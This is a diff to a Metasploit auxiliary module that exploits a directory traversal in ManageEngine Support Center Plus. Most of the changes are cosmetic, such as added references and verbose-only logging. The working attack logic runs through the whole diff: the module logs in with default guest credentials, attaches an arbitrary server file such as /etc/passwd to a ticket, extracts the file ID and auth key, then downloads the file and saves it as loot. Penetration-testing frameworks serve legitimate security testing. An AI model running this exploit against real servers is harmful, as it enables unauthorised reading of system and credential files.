@@ -6,7 +6,6 @@
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
-  Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -27,43 +26,41 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
       'References'     =>
         [
-          [ 'EDB', '31262' ],
-          [ 'URL', 'http://packetstormsecurity.com/files/124975/ManageEngine-Support-Center-Plus-7916-Directory-Traversal.html' ]
+          ['EDB', '31262'],
+          ['OSVDB', '102656'],
+          ['BID', '65199'],
+          ['URL', 'http://packetstormsecurity.com/files/124975/ManageEngine-Support-Center-Plus-7916-Directory-Traversal.html']
         ],
-      'Platform'       => 'java',
-      'Arch'           => ARCH_JAVA,
-      'Targets'        => 'Support Center Plus',
-      'Privileged'     => true,
-      'DisclosureDate' => "Jan 28 2014",
-      'DefaultTarget'  => 0))
+      'DisclosureDate' => "Jan 28 2014"
+    ))
 
-      register_options(
-        [
-          OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),
-          OptString.new('RPORT', [true, 'Remote port of the Support Center Plus installation', '8080']),
-          OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
-          OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
-          OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
-        ], self.class)
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),
+        OptString.new('RPORT', [true, 'Remote port of the Support Center Plus installation', '8080']),
+        OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
+        OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
+        OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
+      ], self.class)
   end
 
   def run_host(ip)
     uri = target_uri.path
     peer = "#{ip}:#{rport}"
 
-    print_status("#{peer} - Retrieving cookie")
+    vprint_status("#{peer} - Retrieving cookie")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri, ""),
+      'uri'    => normalize_uri(uri, "")
     })
 
     if res and res.code == 200
       session = res.get_cookies
     else
-      print_error("#{peer} - Server returned #{res.code.to_s}")
+      vprint_error("#{peer} - Server returned #{res.code.to_s}")
     end
 
-    print_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
+    vprint_status("#{peer} - Logging in as user [ #{datastore['USER']} ]")
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri(uri, "j_security_check"),
@@ -79,14 +76,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 302
-      print_status("#{peer} - Login succesful")
+      vprint_status("#{peer} - Login succesful")
     else
-      print_error("#{peer} - Login was not succesful!")
+      vprint_error("#{peer} - Login was not succesful!")
       return
     end
 
     randomname = Rex::Text.rand_text_alphanumeric(10)
-    print_status("#{peer} - Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
+    vprint_status("#{peer} - Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri(uri, "WorkOrder.do"),
@@ -117,21 +114,21 @@ class Metasploit3 < Msf::Auxiliary
       })
 
     if res and res.code == 200
-      print_status("#{peer} - Ticket created")
+      vprint_status("#{peer} - Ticket created")
       if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
         fileid = $1
-        print_status("#{peer} - File ID is [ #{fileid} ]")
+        vprint_status("#{peer} - File ID is [ #{fileid} ]")
         fileauthkey = $2
-        print_status("#{peer} - Auth Key is [ #{fileauthkey} ]")
+        vprint_status("#{peer} - Auth Key is [ #{fileauthkey} ]")
       else
-        print_error("#{peer} - File ID and AuthKey not found!")
+        vprint_error("#{peer} - File ID and AuthKey not found!")
       end
     else
-      print_error("#{peer} - Ticket not created due to error!")
+      vprint_error("#{peer} - Ticket not created due to error!")
       return
     end
 
-    print_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
+    vprint_status("#{peer} - Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
@@ -156,7 +153,7 @@ class Metasploit3 < Msf::Auxiliary
       )
       print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
     else
-      print_error("#{peer} - Server returned #{res.code.to_s}")
+      vprint_error("#{peer} - Server returned #{res.code.to_s}")
     end
   end
 end
